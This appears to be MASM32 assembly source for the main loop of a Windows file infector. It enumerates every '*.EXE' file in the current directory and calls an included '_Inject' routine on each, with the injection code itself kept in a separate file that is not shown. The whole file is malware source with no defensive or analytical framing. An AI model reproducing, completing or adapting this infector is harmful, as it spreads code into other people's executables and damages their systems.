.386
.model flat, stdcall
option casemap:none

include     windows.inc
include     kernel32.inc
include     user32.inc

includelib  user32.lib
includelib  kernel32.lib

include     masm32.inc
includelib  masm32.lib

include     jambi.inc

.data

;; Error messages
Err_InvalidFileHandle   db  "Invalid file handle.", 0Ah, 0
Err_NoFileFound		db  "No file found...", 0Ah, 0
Err_FindNextFile        db  "FindNextFile error.", 0Ah, 0

Reached     db  "Reached", 10, 0
Error       db  "Error", 10, 0
Success     db  "Successful!", 10, 0

Pattern     db  "*.EXE", 0
NL          db  10, 0

FileFindData    WIN32_FIND_DATA <>

.data?
hFind       dd  ?

.code

include     injection.asm

start:

invoke FindFirstFile, addr Pattern, addr FileFindData
mov hFind, eax

.if (eax==INVALID_HANDLE_VALUE)
    invoke StdOut, addr Err_NoFileFound
    jmp exit
.endif

.while eax!=NULL
    invoke _Inject, addr FileFindData ;; we call injection
    invoke FindNextFile, hFind, addr FileFindData
.endw

invoke GetLastError
.if (eax!=ERROR_NO_MORE_FILES)
    invoke StdOut, addr Err_FindNextFile
    jmp exit
.endif

invoke FindClose, hFind ;; the loop is over so we close the find process

exit:
invoke ExitProcess, 0 ;; it's a mandatory to put this SHIITTTT!

end start
